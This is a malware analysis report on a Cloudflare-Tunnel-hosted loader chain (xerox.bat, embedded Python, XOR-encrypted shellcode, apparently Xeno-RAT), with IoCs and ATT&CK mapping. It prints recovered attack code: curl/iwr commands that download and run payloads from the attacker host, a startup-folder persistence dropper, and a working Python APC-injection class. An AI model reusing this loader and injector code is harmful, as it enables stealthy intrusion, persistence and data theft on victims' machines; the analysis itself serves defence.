# MALWARE ANALYSIS REPORT

**Operation:** Cloudflare-Python Embedded Shellcode Loader (xerox.bat, xeno-rat) 
**Analyst:** _Vasilis_  
**Date:** _2025-12-01_  

---

# **1. Overview**

This report documents a highly modular malware campaign delivered via a **Cloudflare Tunnel**, using a **PDF-themed LNK file**, batch staging, and a **Python 3.13.9 embedded runtime** to host and execute **three encrypted shellcode payloads**.

These payloads are **XOR-encrypted**, optionally **zlib-compressed**, and injected into a suspended `explorer.exe` process via **APC injection**.

Dynamic analysis (ANY.RUN) reveals that the decrypted shellcode contacts at least **two suspicious IP addresses**:

- `178.250.188.98`
- `185.163.204.145`

![[Pasted image 20251201213126.png]]

---

# **2. Infection Chain**

`User → Malicious PDF-LNK → xerox.bat → Python Embed → exc.py Injector → vue/vew/we shellcodes → explorer.exe APC injection → persistence → exfiltration`

### **2.1 Delivery Server (Cloudflare Tunnel)**

Hosted at:

`hxxps://entered-medicine-links-camcorder.trycloudflare.com/`

Command Line:
`curl  -L -o "C:\Users\admin\AppData\Local\rtest\exc.py" "https://entered-medicine-links-camcorder.trycloudflare.com/va/exc.py" `

Contents:

- `/tyho/OR60415OE + OR18750OE.pdf.lnk` (fake PDF)
- `/va/` (payload staging)
    - `exc.py`
    - `xerox.bat`
    - `vue.bin`, `vew.bin`, `we.bin`
    - `a.txt`, `o.txt`, `x.txt`
    - `pdfread.bat`

---

# **3. Technical Analysis**

# **3.1 Stage 1 — `xerox.bat` Initial Loader**

### **3.1.1 Hidden Execution via PowerShell**

Re-launches itself hidden:

`Start-Process -WindowStyle Hidden`

```
if not "%~1"=="h" (
    powershell -WindowStyle Hidden -Command "Start-Process -FilePath '%~f0' -ArgumentList 'h' -WindowStyle Hidden"
    exit /b
)
```
### **3.1.2 Fake PDF Open**

Opens the first PDF from:

- `%USERPROFILE%\Documents`
- `%USERPROFILE%\Downloads`

to trick the user.
```
for %%A in ("%USERPROFILE%\Documents\*.pdf" "%USERPROFILE%\Downloads\*.pdf") do (
    if exist "%%A" (
        start "" /B "%%A" >nul 2>&1
        goto :pdf_opened
    )
)
```

### **3.1.3 Python Embedded Runtime Download**

Downloads:

`https://www.python.org/ftp/python/3.13.9/python-3.13.9-embed-amd64.zip`

Extracts to:
`%LOCALAPPDATA%\rtest\`

```
%x1%%x2% -L -o "%zip_file%" "%py_url%" 2>nul||powershell -c "iwr '%py_url%' -OutFile '%zip_file%'" 2>nul
if exist "%zip_file%" (
    if not exist "%py_dir%" md "%py_dir%"
    tar -xf "%zip_file%" -C "%py_dir%" 2>nul||powershell -c "Expand-Archive '%zip_file%' '%py_dir%' -f" 2>nul
    del "%zip_file%"
)
```

### **3.1.4 Payload Download and Execution**

Downloads:

- `exc.py`
- `vue.bin`, `vew.bin`, `we.bin`
- `a.txt`, `o.txt`, `x.txt`

Executes:

`python.exe exc.py vue.bin o.txt python.exe exc.py vew.bin x.txt python.exe exc.py we.bin a.txt`

```
for %%f in (exc.py vue.bin vew.bin x.txt o.txt we.bin a.txt) do (
    %x1%%x2% -L -o "%py_dir%\%%f" "%custom_url%/%%f" 2>nul||powershell -c "iwr '%custom_url%/%%f' -OutFile '%py_dir%\%%f'" 2>nul
)

cd /d "%py_dir%"
python.exe exc.py vue.bin o.txt
python.exe exc.py vew.bin x.txt
python.exe exc.py we.bin a.txt
```

![[Pasted image 20251201213559.png]]

---

# **3.2 Stage 2 — `pdfread.bat` Persistence Mechanism**

Dropped into Windows startup folder:

`%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\pdfread.bat`

Re-runs the injector on every logon → continual reinfection.

```
set "s1=star"
set "s2=tup"
set "s3=pdfr"
set "s4=ead"
set "startup_dir=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup"
%x1%%x2% -L -o "%startup_dir%\%s3%%s4%.bat" "%custom_url%/%s3%%s4%.bat" 2>nul||powershell -c "iwr '%custom_url%/%s3%%s4%.bat' -OutFile '%startup_dir%/%s3%%s4%.bat'" 2>nul
```

---

# **3.3 Stage 3 — Python Injector (`exc.py`)**

The injector (`SIELInjector`) does:

- Multi-layer XOR decrypt
- Optional zlib decompress
-  APC process injection into suspended explorer.exe

```
class SIELInjector:
    def __init__(self):
        self.process = b"explorer.exe"
        
    def decrypt(self, data, keys):
        for key in reversed(keys):
            data = bytes(b ^ key[i % len(key)] for i, b in enumerate(data))
        return data

    def inject(self, shellcode):
        si = STARTUPINFOA()
        si.cb = ctypes.sizeof(si)
        pi = PROCESS_INFORMATION()
        CREATE_SUSPENDED = 0x00000004
        
        if not CreateProcessA(None, self.process, None, None, False, CREATE_SUSPENDED, None, None, byref(si), byref(pi)):
            return False

        alloc = VirtualAllocEx(pi.hProcess, None, len(shellcode), 0x3000, 0x40)
        if not alloc:
            return False

        written = c_ulong(0)
        shellcode_buf = create_string_buffer(shellcode)
        
        if not WriteProcessMemory(pi.hProcess, alloc, shellcode_buf, len(shellcode), byref(written)):
            return False

        QueueUserAPC(alloc, pi.hThread, None)
        ResumeThread(pi.hThread)
        
        CloseHandle(pi.hProcess)
        CloseHandle(pi.hThread)
        return True
```

Key APIs used:

- `CreateProcessA`
- `VirtualAllocEx`
- `WriteProcessMemory`
- `QueueUserAPC`
- `ResumeThread`

This is characteristic of stealthy **in-memory loaders**.

---

# **3.4 Stage 4 — Decrypted Shellcode Modules**

The extracted disassemblies:
- `decrypted_vue_final.bin.asm`
- `decrypted_vew_final.bin.asm`
- `decrypted_we_final.bin.asm`

Each module shows:

- x64 PIC (position-independent code)
- Giant encrypted `dq` blobs
- API-table-based calls like:
    - `call qword ptr [rsi+3Ch]`
    - `call qword ptr [rsi+90h]`
    - `call qword ptr [rsi+0A8h]`
        
- Loader-specific utilities:
    - custom `memcpy`
    - custom `memset`
    - decompression/decryption engines

This strongly suggests:

- A deeper payload hidden inside each shellcode block
- Final C2 domains & exfil logic remain encrypted until runtime
    

![[Pasted image 20251201213846.png]]

---

# **4. Dynamic Analysis Findings (ANY.RUN)**

The live sandbox results provided **two new C2 IPs** contacted by the injected shellcode:

### **Outbound Network IoCs**

`178.250.188.98` and `185.163.204.145`

These connections occurred **after** the shellcode executed inside `explorer.exe`, confirming:

- The static shellcode contains encrypted network endpoints
- It is indeed capable of C2 beaconing or exfiltration

---

# **5. Detection & Mitigation**

## **5.1 MITRE ATT&CK Mapping**

|Tactic|Technique|Description|
|---|---|---|
|Initial Access|T1566|Malicious PDF-themed LNK|
|Execution|T1059.003|Batch script execution|
|Execution|T1059.006|Python-based loader|
|Defense Evasion|T1027|Encrypted payloads|
|Defense Evasion|T1140|Multi-key XOR/zlib decrypt|
|Persistence|T1547.001|Startup folder persistence|
|Privilege Escalation|T1055.004|APC injection|
|C2|T1071|Suspicious outbound IP connections|
|Discovery|T1620|Cloudflare Tunnel hosting|

---

# **6. IoCs (Full)**

## **6.1 Network**

**Primary Hosting:**

`hxxps://entered-medicine-links-camcorder.trycloudflare.com/`

**Confirmed C2 from ANY.RUN:**

`178.250.188.98` and `185.163.204.145`

**Legitimate but abused:**

`https://www.python.org/ftp/python/3.13.9/python-3.13.9-embed-amd64.zip`

---

## **6.2 Host Artifacts**

`%LOCALAPPDATA%\rtest\python.exe %LOCALAPPDATA%\rtest\exc.py %LOCALAPPDATA%\rtest\vue.bin %LOCALAPPDATA%\rtest\vew.bin %LOCALAPPDATA%\rtest\we.bin %LOCALAPPDATA%\rtest\a.txt %LOCALAPPDATA%\rtest\x.txt %LOCALAPPDATA%\rtest\o.txt %APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\pdfread.bat`

---

## **6.3 Payload Hashes**

**SHA256:**

`vue: 7B9EDBD936BF837C6BF383C3A05C7D80A279498CF25CC40A5D8D78F86B61B36F` 
`vew: 6ECB48B7550CF4ACCC6BD50812D7212ED6A14C305A46447112A43409394EC12B` 
`we:  3745180E25A1298BEED49BF557A29C649B23F109693451382EE73F50CCDD4907`

---

# **7. Conclusion**

This malware is a sophisticated **modular loader** leveraging:

- Cloudflare Tunnels
    
- Python 3.13 runtime
    
- XOR/zlib decrypted shellcode
    
- APC injection
    
- Multiple shellcode “modules”
    
- Encrypted configuration blocks
    
- Suspicious outbound connections to:
    
    - `178.250.188.98`
        
    - `185.163.204.145`
        

The main capabilities of the final payload are **still encrypted** in the shellcode blobs, but dynamic analysis proves active C2 communication.

This strongly suggests a **stealer or RAT family with multiple modules**, with its behavior prompting to Xeno-RAT.
